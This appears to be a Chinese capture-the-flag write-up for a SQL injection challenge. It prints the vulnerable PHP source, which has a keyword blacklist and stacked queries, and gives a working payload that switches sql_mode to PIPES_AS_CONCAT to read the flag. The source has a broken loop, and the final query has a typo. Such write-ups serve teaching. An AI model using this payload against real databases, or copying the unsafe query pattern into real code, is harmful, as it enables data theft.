该题暴露了源码：

```javascript
<?php
    session_start();

    include_once "config.php";

    $post = array();
    $get = array();
    global $MysqlLink;

    //GetPara();
    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
    if(!$MysqlLink){
        die("Mysql Connect Error!");
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die("Choose Database Error!");
    }

    foreach ($_POST as $k=>$v){
        if(!empty($v)&&is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=>$v){
        }
    }
    //die();
    ?>

<html>
<head>
</head>

<body>

<a> Give me your flag, I will tell you if the flag is right. </a>
<form action="" method="post">
<input type="text" name="query">
<input type="submit">
</form>
</body>
</html>

<?php

    if(isset($post['query'])){
        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\"";
        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
        if(preg_match("/{$BlackList}/is",$post['query'])){
            //echo $post['query'];
            die("Nonono.");
        }
        if(strlen($post['query'])>40){
            die("Too long.");
        }
        $sql = "select ".$post['query']."||flag from Flag";
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));

    }

    ?>
```



查询语句：

```javascript
   $sql = "select ".$post['query']."||flag from Flag";
```



Oracle 在缺省情况下支持使用 " || "连接字符串 ，

 但是在MySQL中缺省不支持 ，MySQL 缺省使用 CONCAT 系列函数来连接字符串 .

可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT 来实现将 " || "视为 字符串连接符 而非 或 运算符 .

因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag ，如下：

```javascript
1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
```



拼接之后变成：

```javascript
select 1;set sqlmode=PIPES_AS_CONCAT;SELECT 1 || flag from Flag
```



sql_mode原理：

https://blog.csdn.net/lixora/article/details/60572357